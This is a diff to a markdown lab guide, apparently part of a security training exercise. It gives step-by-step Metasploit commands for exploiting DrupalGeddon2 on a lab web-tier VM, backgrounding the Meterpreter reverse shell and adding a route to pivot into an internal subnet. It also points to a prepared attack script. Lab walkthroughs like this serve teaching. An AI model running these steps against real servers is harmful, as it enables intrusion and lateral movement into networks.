@@ -497,16 +497,25 @@ You have now successfully completed a simple attack scenario ! In the next exerc
 
 In this exercise, we will use already established **reverse shell** from the Drupal servers as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 
 
-> **Note**: If you prefer not to manually go through this attack scenario, using the below steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
-**RHOST** on line 3 should be the IP address of the **App1-WEB-TIER VM**
-**SUBNET** on line 6 (route add) should be the **Internal Network** subnet
-
 **Initiate DrupalGeddon2 attack against App1-WEB-TIER VM (again)**
 1.	If you have previously existed the SSH or Console session, restart the SSH or Console session with the  **External VM** 
 2. If you have previously exited Metasploit, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
-    * Type **exploit** to initiate the exploit attempt
+    * Type **exploit -z** to initiate the exploit attempt and background the session.
+    * Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
     
 6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
+
+
+
+
+
+If you prefer not to manually go through this attack scenario, using the below steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
+**RHOST** on line 3 should be the IP address of the **App1-WEB-TIER VM**
+**SUBNET** on line 6 (route add) should be the **Internal Network** subnet
+**LHOST** on line 9 should be the IP address of the **External VM** (this local machine)
+**RHOST** on line 10 should be the IP address of the **App1-APP-TIER VM**
+**RHOST** on line 13 should be the IP address of the **App2-APP-TIER VM**
+
